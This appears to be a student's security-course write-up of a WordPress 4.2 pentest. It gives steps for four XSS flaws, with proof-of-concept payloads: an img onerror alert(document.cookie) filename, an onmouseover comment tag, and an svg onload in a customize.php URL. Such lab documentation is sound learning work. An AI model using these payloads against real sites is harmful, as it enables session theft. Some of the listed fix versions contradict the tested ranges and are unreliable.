# Project 7 - WordPress Pentesting

Time spent: **4** hours spent in total

> Objective: Find, analyze, recreate, and document **three vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Challenge 7: wpscan vs. WP 4.2
  - [ ] Summary: 
    - Vulnerability types: XXS
    - Tested in version: 4.2
    - Fixed in version: 4.2.10
  - [ ] GIF Walkthrough: https://gfycat.com/gifs/detail/BothAgileGypsymoth
  - [ ] Steps to recreate: 
            1. Rename an image file with the following img src= a onerror= alert(document.cookie) .jpg
            2. Create a post, upload, and publish 
            3. Change the attachment display setting to "Attachment page"
            4. A javascript alert will now appear
  - [ ] Affected source code:
    - https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html
    
2. (Required) Vulnerability 1
  - [ ] Summary: 
    - Vulnerability types: XXS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: https://gfycat.com/gifs/detail/UnnaturalNastyBluebottlejellyfish
  - [ ] Steps to recreate: 
            1. Access your wordpress and in the comments leave the html tag; <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAAA...[64k]...AA'></a>
            2. When you move your mouse a javascript alert will appear
  - [ ] Affected source code:
    - https://klikki.fi/adv/wordpress2.html
    
    
3. (Required) Vulnerability 2
  - [ ] Summary: 
    - Vulnerability types: XXS
    - Tested in version: 3.7 - 4.4
    - Fixed in version: 4.2.6
  - [ ] GIF Walkthrough: https://gfycat.com/gifs/detail/CelebratedFalseIggypops
  - [ ] Steps to recreate: 
            1. Using the url: http://www.exmaple.com/wp-admin/customize.php?theme=<svg onload=alert(1)>
            2. Replace the "example.com" with the wordpress site
            3. It will bypass and display a javascript alert
  - [ ] Affected source code:
    - https://wpvulndb.com/vulnerabilities/8358
    
 4. (Required) Vulnerability 4
  - [ ] Summary: 
    - Vulnerability types: XXs
    - Tested in version: 3.3 - 4.7.4
    - Fixed in version: 4.2.15
  - [ ] GIF Walkthrough: https://gfycat.com/gifs/detail/CelebratedFalseIggypops
  - [ ] Steps to recreate: 
            1. Get a file thats over 20mb and rename it Dinosaurs secret life img src=x onerror=alert(1)>.png
            2. Create a media and attempt to upload
            3. The file size is exceed and a javascript alert appears
  - [ ] Affected source code:
    - https://hackerone.com/reports/203515

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
